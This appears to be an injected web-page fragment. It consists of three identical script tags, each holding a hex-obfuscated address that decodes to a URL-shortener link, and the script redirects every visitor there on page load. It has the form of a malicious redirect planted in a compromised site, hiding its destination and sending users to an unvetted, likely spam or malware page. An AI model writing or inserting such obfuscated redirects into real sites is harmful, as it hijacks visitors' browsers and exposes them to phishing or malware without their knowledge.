<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>